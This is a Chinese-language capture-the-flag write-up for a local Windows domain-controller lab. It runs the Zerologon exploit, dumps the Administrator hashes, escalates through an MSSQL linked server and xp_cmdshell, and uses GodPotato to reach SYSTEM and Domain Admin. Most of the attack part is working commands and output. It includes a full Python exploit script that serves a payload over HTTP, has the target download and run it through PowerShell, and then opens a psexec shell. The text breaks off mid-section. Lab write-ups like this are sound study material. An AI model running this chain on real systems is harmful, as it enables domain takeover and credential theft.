# Yarn<font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">  </font>
## 前置准备
### 先定义变量：
```plain
$vm = 'f5429e33-3d2c-44cd-8f77-3db2ea0c74ba' $vbox = 'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe' $plink = 'C:\Program Files\PuTTY\plink.exe' 
```

### 确认虚拟机在运行：
```plain
& $vbox list runningvms 
```

### 看网卡模式和现有转发：
```plain
& $vbox showvminfo $vm --machinereadable | Select-String 'nic|Forwarding' 
```

### 看来宾 IP：
```plain
& $vbox guestproperty enumerate $vm | Select-String 'V4/IP'
```

![](/image/myself%20machine/Castlevania-Unexpected-64.png)

## 服务器转发
接下来做服务器转发 本来想用kali 发现两个c段不同不好通信

![](/image/myself%20machine/Castlevania-Unexpected-65.png)

被迫选择服务器中转

```plain
$vm = 'f5429e33-3d2c-44cd-8f77-3db2ea0c74ba'
$vbox = 'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe'
& $vbox guestproperty enumerate $vm | Select-String 'V4/IP'
```

![](/image/myself%20machine/Castlevania-Unexpected-66.png)

做中转

![](/image/myself%20machine/Castlevania-Unexpected-67.png)

## 安装环境并连接本机
安装环境并连接本机:

```plain
python3 -m venv ~/babydc-venv
. ~/babydc-venv/bin/activate
pip install impacket ldap3 pyfiglet termcolor
sudo apt update
sudo apt install -y ldap-utils socat curl
curl -L -o ~/zerologon.py https://raw.githubusercontent.com/VoidSec/CVE-2020-1472/master/cve-2020-1472-exploit.py
```

![](/image/myself%20machine/Castlevania-Unexpected-68.png)

## 检查确认
检查：

```plain
nc -vz 127.0.0.1 21389
nc -vz 127.0.0.1 21445
nc -vz 127.0.0.1 20135
```

![](/image/myself%20machine/Castlevania-Unexpected-69.png)

确认 LDAP：

![](/image/myself%20machine/Castlevania-Unexpected-70.png)

## 本地代理
. Ubuntu 启动本地代理

```plain
sudo pkill -f "socat TCP-LISTEN:135" || true
sudo pkill -f "socat TCP-LISTEN:445" || true
sudo pkill -f "socat TCP-LISTEN:49674" || true
sudo pkill -f "socat TCP-LISTEN:49667" || true
sudo nohup socat TCP-LISTEN:135,reuseaddr,fork TCP:127.0.0.1:20135 >/tmp/socat135.log 2>&1 &
sudo nohup socat TCP-LISTEN:445,reuseaddr,fork TCP:127.0.0.1:21445 >/tmp/socat445.log 2>&1 &
sudo nohup socat TCP-LISTEN:49674,reuseaddr,fork TCP:127.0.0.1:34974 >/tmp/socat49674.log 2>&1 &
sudo nohup socat TCP-LISTEN:49667,reuseaddr,fork TCP:127.0.0.1:34967 >/tmp/socat49667.log 2>&1 &
```

![](/image/myself%20machine/Castlevania-Unexpected-71.png)

## 监听
开启监听：

![](/image/myself%20machine/Castlevania-Unexpected-72.png)

## 测 SMB
```plain
python3 - <<'PY'
from impacket.smbconnection import SMBConnection
c = SMBConnection('CASTLEVANIA', '127.0.0.1', sess_port=445, timeout=10)
print('dialect', hex(c.getDialect()))
print('server', c.getServerName())
print('domain', c.getServerDomain())
print('os', c.getServerOS())
PY
```

![](/image/myself%20machine/Castlevania-Unexpected-73.png)

## Zerologon
打 Zerologon

```plain
printf 'y\n' | python3 ~/zerologon.py -t 127.0.0.1 -n CASTLEVANIA
```

![](/image/myself%20machine/Castlevania-Unexpected-74.png)

## 导出管理员哈希
导出管理员哈希：

```plain
secretsdump.py -just-dc-user Administrator -no-pass 'XMCVE.local/CASTLEVANIA$@127.0.0.1' -dc-ip 127.0.0.1 -target-ip 127.0.0.1
```

![](/image/myself%20machine/Castlevania-Unexpected-75.png)

```plain
babydc-venv) ubuntu@VM-16-10-ubuntu:~$ secretsdump.py -just-dc-user Administrator -no-pass 'XMCVE.local/CASTLEVANIA$@127.0.0.1' -dc-ip 127.0.0.1 -target-ip 127.0.0.1
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:13e54f64708d675c0a54eb4b40e2ca21b2fcb3e6298969d741fc6e70a9367786
Administrator:aes128-cts-hmac-sha1-96:aafdd9e5c02b41dece2a83b2d9b4439c
Administrator:des-cbc-md5:80584683e63d5845
[*] Cleaning up...
(babydc-venv) ubuntu@VM-16-10-ubuntu:~$
```

## 验证高权限命令执行
```plain
psexec.py -hashes :d94f9831271e229dbc6e712097b63168 'XMCVE.local/Administrator@127.0.0.1' "cmd.exe /c whoami & hostname"
```

![](/image/myself%20machine/Castlevania-Unexpected-76.png)

```plain
(babydc-venv) ubuntu@VM-16-10-ubuntu:~$ psexec.py -hashes :d94f9831271e229dbc6e712097b63168 'XMCVE.local/Administrator@127.0.0.1' "cmd.exe /c whoami & hostname"
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file XWajdGZq.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service kiue on 127.0.0.1.....
[*] Starting service kiue.....
[!] Press help for extra shell commands                                                                                                                                            nt authority\system
[*] Process cmd.exe /c whoami & hostname finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on 127.0.0.1.....
CASTLEVANIA
[*] Stopping service kiue.....
[*] Removing service kiue.....
[*] Removing file XWajdGZq.exe.....
(babydc-venv) ubuntu@VM-16-10-ubuntu:~$
```

## 成功获得shell
```plain
Administrator:aes256-cts-hmac-sha1-96:13e54f64708d675c0a54eb4b40e2ca21b2fcb3e6298969d741fc6e70a9367786
Administrator:aes128-cts-hmac-sha1-96:aafdd9e5c02b41dece2a83b2d9b4439c
Administrator:des-cbc-md5:80584683e63d5845
```

# 空白(土豆提权)
## <font style="color:rgb(51, 51, 51);">题目分析</font>
<font style="color:rgb(51, 51, 51);">靶机对外开放了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">80</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">445</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1433</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">25</font>`<font style="color:rgb(51, 51, 51);">。</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">80</font>`<font style="color:rgb(51, 51, 51);"> 口只有一个很简单的 IIS 默认站点，首页没有可利用逻辑，但站点目录里放了一个明文连接配置，直接给出 SQL 登录信息：</font>

```plain
server=localhost;
user=wuwupor;
password=lovlyBaby
database=master
```

<font style="color:rgb(51, 51, 51);">先用这组账号连接 SQL Server，可以看到当前登录只是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">master</font>`<font style="color:rgb(51, 51, 51);"> 里的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">guest</font>`<font style="color:rgb(51, 51, 51);">，本身不是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`<font style="color:rgb(51, 51, 51);">。问题的关键在 linked server。枚举 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sys.servers</font>`<font style="color:rgb(51, 51, 51);"> 之后可以看到本机额外配置了两个 linked server：</font>

```plain
SELECT name, product, provider, data_source, is_linked, is_remote_login_enabled
FROM sys.servers;
```

<font style="color:rgb(51, 51, 51);">结果里有：</font>

```plain
POO_CONFIG
POO_PUBLIC
```

<font style="color:rgb(51, 51, 51);">继续直接在 linked server 上执行查询，能看到两个 linked server 的远端上下文完全不同：</font>

```plain
EXEC ('SELECT @@SERVERNAME AS server_name,
             SYSTEM_USER   AS current_login,
             ORIGINAL_LOGIN() AS original_login,
             IS_SRVROLEMEMBER(''sysadmin'') AS is_sysadmin') AT POO_CONFIG;

EXEC ('SELECT @@SERVERNAME AS server_name,
             SYSTEM_USER   AS current_login,
             ORIGINAL_LOGIN() AS original_login,
             IS_SRVROLEMEMBER(''sysadmin'') AS is_sysadmin') AT POO_PUBLIC;
```

<font style="color:rgb(51, 51, 51);">返回结果里：</font>

```plain
POO_CONFIG -> current_login = poo_config, is_sysadmin = 0
POO_PUBLIC -> current_login = sa,         is_sysadmin = 1
```

<font style="color:rgb(51, 51, 51);">到这里利用链已经很清楚了。外部只要持有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor / lovlyBaby</font>`<font style="color:rgb(51, 51, 51);">，就能通过 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 借壳成 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sa</font>`<font style="color:rgb(51, 51, 51);">。</font>

## <font style="color:rgb(51, 51, 51);">SQL 利用</font>
<font style="color:rgb(51, 51, 51);">确认配置项时还能看到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 已经开启：</font>

```plain
SELECT name, CAST(value_in_use AS int) AS value_in_use
FROM sys.configurations
WHERE name IN ('xp_cmdshell', 'Ole Automation Procedures', 'Ad Hoc Distributed Queries', 'clr enabled', 'remote access');
```

<font style="color:rgb(51, 51, 51);">于是可以直接通过 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 执行系统命令：</font>

EXEC ('EXEC xp_cmdshell ''whoami''') AT POO_PUBLIC;

<font style="color:rgb(51, 51, 51);">返回身份是：</font>

xmcve\sqlsvc

<font style="color:rgb(51, 51, 51);">接着看权限：</font>

EXEC ('EXEC xp_cmdshell ''whoami /priv''') AT POO_PUBLIC;

<font style="color:rgb(51, 51, 51);">输出里最关键的一项是：</font>

SeImpersonatePrivilege    Enabled

<font style="color:rgb(51, 51, 51);">这说明 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 已经满足典型的本地提权条件，只差一条能把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`<font style="color:rgb(51, 51, 51);"> 用起来的链。这里直接使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);">，它对 Windows Server 2019 可用。</font>

## <font style="color:rgb(51, 51, 51);">系统提权</font>
<font style="color:rgb(51, 51, 51);">利用思路非常直接：</font>

1. <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 下发 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato.exe</font>`
2. <font style="color:rgb(51, 51, 51);">让 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 身份执行一条命令</font>
3. <font style="color:rgb(51, 51, 51);">把已知明文口令的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 加进 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Domain Admins</font>`
4. <font style="color:rgb(51, 51, 51);">重新用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 发起网络登录，直接拿管理员级远程会话</font>

`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">whoami</font>`<font style="color:rgb(51, 51, 51);"> 验证时，返回结果里已经能看到：</font>

CurrentUser: NT AUTHORITY\SYSTEM

<font style="color:rgb(51, 51, 51);">然后执行：</font>

net group "Domain Admins" sqlsvc /add /domain

<font style="color:rgb(51, 51, 51);">命令成功后，重新使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 进行远程执行，就能拿到管理员级 shell。这里用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec</font>`<font style="color:rgb(51, 51, 51);"> 验证，返回结果是：</font>

```plain
nt authority\system
CASTLEVANIA
```

<font style="color:rgb(51, 51, 51);">成功拿到admin shell</font>

## <font style="color:rgb(51, 51, 51);">Exp</font>
<font style="color:rgb(51, 51, 51);">下面给出完整利用脚本。脚本会先连 SQL，确认 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 可用，然后临时开启一个本地 HTTP 服务，把同目录中的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato.exe</font>`<font style="color:rgb(51, 51, 51);"> 下发到目标，执行提权，再自动调用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec</font>`<font style="color:rgb(51, 51, 51);"> 拉起管理员 shell。</font>

```plain
import argparse
import contextlib
import functools
import http.server
import shutil
import socket
import socketserver
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytds


def quote_sql(value: str) -> str:
    return value.replace("'", "''")


def get_local_ip_for_target(target_ip: str) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect((target_ip, 1433))
        return sock.getsockname()[0]
    finally:
        sock.close()


class QuietHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        pass


class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


@contextlib.contextmanager
def serve_directory(directory: Path, host: str):
    handler = functools.partial(QuietHandler, directory=str(directory))
    server = ThreadingHTTPServer((host, 0), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server.server_address[1]
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=1)


class MSSQLExploit:
    def __init__(self, server: str, user: str, password: str, database: str = "master", port: int = 1433):
        self.conn = pytds.connect(
            server=server,
            database=database,
            user=user,
            password=password,
            port=port,
            validate_host=False,
            use_tz=False,
            autocommit=True,
        )

    def close(self) -> None:
        self.conn.close()

    def run_query(self, query: str):
        cur = self.conn.cursor()
        cur.execute(query)
        if not cur.description:
            return []
        rows = cur.fetchall()
        columns = [c[0] for c in cur.description]
        return [dict(zip(columns, row)) for row in rows]

    def xp_cmdshell_via_public(self, command: str):
        query = f"EXEC ('EXEC xp_cmdshell ''{quote_sql(command)}''') AT POO_PUBLIC"
        return self.run_query(query)


def print_rows(title: str, rows) -> None:
    print(f"\n=== {title} ===")
    if not rows:
        print("(no rows)")
        return
    for row in rows:
        print(row)


def ensure_psexec() -> str:
    candidates = [
        shutil.which("psexec.py"),
        str(Path(sys.executable).with_name("psexec.py")),
        str(Path(sys.executable).resolve().parent.parent / "Scripts" / "psexec.py"),
    ]
    for candidate in candidates:
        if candidate and Path(candidate).exists():
            return candidate
    raise FileNotFoundError("psexec.py not found in PATH or next to the current Python installation.")


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit for codegate babydc.")
    parser.add_argument("--target", default="192.168.124.7")
    parser.add_argument("--sql-user", default="wuwupor")
    parser.add_argument("--sql-password", default="lovlyBaby")
    parser.add_argument("--domain", default="XMCVE")
    parser.add_argument("--pivot-user", default="sqlsvc")
    parser.add_argument("--pivot-password", default="Sql!2026")
    parser.add_argument("--command", default="cmd.exe", help="Command passed to psexec after sqlsvc becomes Domain Admin.")
    args = parser.parse_args()

    base_dir = Path(__file__).resolve().parent
    godpotato = base_dir / "GodPotato.exe"
    if not godpotato.exists():
        raise FileNotFoundError(f"Missing helper: {godpotato}")

    target_ip = args.target
    local_ip = get_local_ip_for_target(target_ip)
    print(f"[+] target: {target_ip}")
    print(f"[+] local callback IP: {local_ip}")

    sql = MSSQLExploit(target_ip, args.sql_user, args.sql_password)
    try:
        print_rows(
            "linked server context",
            sql.run_query(
                "EXEC ('SELECT @@SERVERNAME AS server_name, SYSTEM_USER AS current_login, "
                "IS_SRVROLEMEMBER(''sysadmin'') AS is_sysadmin') AT POO_PUBLIC"
            ),
        )
        print_rows("xp_cmdshell identity", sql.xp_cmdshell_via_public("whoami /priv"))

        with serve_directory(base_dir, "0.0.0.0") as port:
            download_cmd = (
                'powershell -c "try {(New-Object Net.WebClient).DownloadFile('
                f"'http://{local_ip}:{port}/{godpotato.name}',"
                "'C:\\Windows\\Temp\\GodPotato.exe');"
                'Write-Output OK} catch { Write-Output $_.Exception.Message }"'
            )
            print_rows("download helper", sql.xp_cmdshell_via_public(download_cmd))
            print_rows(
                "helper presence",
                sql.xp_cmdshell_via_public(
                    'powershell -c "Get-Item \'C:\\Windows\\Temp\\GodPotato.exe\' | '
                    'Select-Object Name,Length | Format-List"'
                ),
            )

        add_group_cmd = (
            'C:\\Windows\\Temp\\GodPotato.exe -cmd '
            f'"cmd /c net group \\"Domain Admins\\" {args.pivot_user} /add /domain"'
        )
        print_rows("godpotato group add", sql.xp_cmdshell_via_public(add_group_cmd))
        time.sleep(2)
    finally:
        sql.close()

    psexec = ensure_psexec()
    user_spec = f"{args.domain}/{args.pivot_user}:{args.pivot_password}@{target_ip}"
    cmd = [sys.executable, psexec, user_spec, args.command]
    print(f"[+] launching psexec: {' '.join(cmd)}")
    return subprocess.call(cmd)


if __name__ == "__main__":
    raise SystemExit(main())
```

# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Wadding</font>(土豆提权)
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">题面要求并不是提交在线环境里的字符串 flag，而是：</font>

```latex
对镜像本地搭建并渗透，拿到 Administrator shell，提交 WP 到邮箱审核，通过后才给官方 flag
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这台镜像里我已经拿到了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Administrator</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 远程执行权限，当前可复现的管理员 shell 证明如下：</font>

```latex
xmcve\administrator
CASTLEVANIA
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">另外，镜像里还残留了一个被删除的本地 flag 文本，在回收站文件内容中可恢复出：</font>

```latex
FLAG{XMCVE_Castlevania_Bloodlines_DA_Pwned}
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">但要说明，这个并不是题面承诺的“官方比赛 flag”，因为题面明确说了官方 flag 要在提交 WP 审核后才发放。</font>

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">环境信息</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">题目给了本地 OVA：</font>

```latex
D:\Install\Bloodstained.ova
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">导入后我把机器改成：</font>

+ `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">NIC1 = Host-Only</font>`
+ `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">NIC2 = NAT</font>`

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这样宿主机可以直接访问客机。</font>

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">客机关键信息：</font>

+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">主机名：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">CASTLEVANIA</font>`
+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">域名：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">XMCVE.local</font>`
+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Web：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">80/tcp</font>`
+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">MSSQL：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">1433/tcp</font>`
+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">LDAP / AD：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">389, 445, 88 ...</font>`

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">通过 Guest Additions 和网络探测确认到：</font>

+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Host-only 网卡：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">169.254.212.20</font>`
+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">NAT 网卡：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">10.0.3.15</font>`

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">攻击面梳理</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">首页只有一个静态维护页：</font>

```html
<h1>Employee Portal</h1>
<p>Under maintenance...</p>

```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">看起来没什么内容，但离线查看 VMDK 后发现 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">inetpub\wwwroot</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 下除了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">index.html</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 之外还有一个非常关键的文件：</font>

```latex
C:\inetpub\wwwroot\poo_connection.txt
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">内容是明文 SQL 连接串：</font>

```latex
server=localhost;
user=wuwupor;
password=lovlyBaby
database=master
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这一条直接把 MSSQL 入口送出来了。</font>

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第一步：连接 MSSQL</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">用连接串登录 SQL Server：</font>

```latex
wuwupor / lovlyBaby
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">登录成功，但当前账号不是 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sysadmin</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">：</font>

```sql
select is_srvrolemember('sysadmin')
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">返回 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">0</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">继续枚举时，发现 SQL Server 上配置了两个非常可疑的 linked server：</font>

```sql
select name, product, provider, data_source,
       is_rpc_out_enabled, is_data_access_enabled
from sys.servers
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">结果里有：</font>

+ `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">POO_PUBLIC</font>`
+ `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">POO_CONFIG</font>`

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第二步：利用 linked server 提权到 SQL sysadmin</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">进一步验证这两个 linked server 的远端身份：</font>

```sql
select * from openquery(POO_PUBLIC, 'select @@servername as srv, db_name() as db, system_user as su, user_name() as un')
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">返回：</font>

```latex
srv = CASTLEVANIA
db  = master
su  = sa
un  = dbo
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">也就是说：</font>

```latex
wuwupor -> POO_PUBLIC -> localhost 上的 sa/dbo
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这就相当于把本来不具备 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sysadmin</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 的账号，借 linked server 直接借成了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sa</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">而且 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">xp_cmdshell</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 已经是开启状态：</font>

```sql
exec ('exec master..sp_configure ''xp_cmdshell''') at POO_PUBLIC
```

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第三步：拿到系统命令执行</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">通过 linked server 执行命令：</font>

```sql
exec ('exec master..xp_cmdshell ''whoami''') at POO_PUBLIC
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">回显是：</font>

```latex
xmcve\sqlsvc
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">也就是说当前操作系统命令执行身份是 SQL Server 服务账号 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">xmcve\sqlsvc</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">继续查它的特权：</font>

```latex
whoami /priv
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">可以看到：</font>

```latex
SeImpersonatePrivilege        Enabled
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">所以标准的 Potato 链是可用的。</font>

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第四步：为什么 PrintSpoofer 不行</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">我最开始先试了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">PrintSpoofer</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">，但很快发现这台机器的 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Spooler</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 是关着的，而且启动类型是 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Disabled</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">：</font>

```latex
Get-Service Spooler
Status    : Stopped
StartType : Disabled
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">因此 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">PrintSpoofer</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 这条链虽然二进制能执行，但不会真正完成提权。</font>

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第五步：改用 GodPotato</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">由于系统是 Windows Server 2019，且 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sqlsvc</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 拥有 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">SeImpersonatePrivilege</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">，直接换成 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GodPotato</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 即可。</font>

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">我在宿主机开了一个临时 HTTP 服务，把 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GodPotato-NET4.exe</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 投到客机，然后通过 SQL 执行：</font>

```latex
